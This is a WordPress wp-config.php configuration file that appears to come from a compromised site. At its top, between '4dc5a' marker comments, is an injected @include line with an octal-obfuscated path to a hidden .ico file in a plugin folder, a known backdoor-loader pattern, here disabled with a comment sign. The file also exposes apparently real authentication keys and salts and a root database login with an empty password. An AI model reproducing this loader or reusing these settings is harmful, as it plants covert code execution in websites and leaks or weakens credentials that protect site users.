<?php
/*4dc5a*/

#@include "\057var\057www\057htm\154/au\164oim\165nca\162e.c\157m/w\160-co\156ten\164/pl\165gin\163/ma\163hsh\141rer\057.29\06230d\063f.i\143o";

/*4dc5a*/
/** Enable W3 Total Cache */
#define('WP_CACHE', true); // Added by W3 Total Cache


/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'aicwordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', '');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         '5dstzklu4rwpvmqi7posjczh0w7ig7yxoswkr4ccjttjqszczq0czt8jdevn61p3');
define('SECURE_AUTH_KEY',  '46psmmiwfp2uadkeeussiu6ubmnt4ff8pxoxz1esdleehnotdr5k8nqf9i98aj8g');
define('LOGGED_IN_KEY',    '61lvotyw9f77pfkkqgyxcbeyfljfvrcx70o0cmi75rl1to0hemnugwvmeoa5us3y');
define('NONCE_KEY',        'tm0yp4fognmxo6p4fktqmcz8r9bgh1lmd4pzdnk1tpryb9okxxipker4pvslnqbs');
define('AUTH_SALT',        'vijghtc2lnhw94hf8kjycorzqgrlthzno4tzvrnv2nhforunuqxuzqaubxhqrpvf');
define('SECURE_AUTH_SALT', 'wackpmxk9lrnvpx9lpnrsrwslbridwxfwsaggvbltszosigkxaq8w0xcknsaimsy');
define('LOGGED_IN_SALT',   'a9rlxiyprw6vzoacltebcsdpj0hkowxv1squdf8jyjtdv6e85l99rpx0iooppcjq');
define('NONCE_SALT',       'kcui8vyy1lrpxvyb9vunyxbie0pifnvnkir9d9smxn0rqt61hbfa4tobibsmz4sf');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp92_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);
define('DISABLE_WP_CRON', true);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');
	
define('FORCE_SSL_ADMIN', true);

if (strpos($_SERVER['HTTP_X_FORWARDED_PROTO'], 'https') !== false) {
    $_SERVER['HTTPS'] = 'on';
}

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
